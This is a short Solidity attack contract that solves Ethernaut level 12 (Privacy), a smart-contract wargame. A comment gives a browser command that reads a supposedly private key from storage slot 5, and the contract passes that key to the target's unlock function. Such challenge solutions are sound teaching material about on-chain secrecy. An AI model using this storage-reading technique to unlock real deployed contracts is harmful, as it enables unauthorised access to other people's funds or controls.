// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IPrivacy.sol";

/**
 * @title Privacy Attack (Ethernaut Challenge Level 12 - Privacy)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 12
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B
 * @custom:security-contact emretepedev@gmail.com
 */
contract PrivacyAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @dev To get key from storage, you can run this script in browser:
     * > (await web3.eth.getStorageAt(contract.address, 5)).slice(0, 2 + 32)
     * @param target Address of target contract
     * @param key Value of key to unlock
     */
    function attack(IPrivacy target, bytes16 key) external {
        target.unlock(key);

        require(!target.locked(), "Privacy: Attack failed");
    }
}
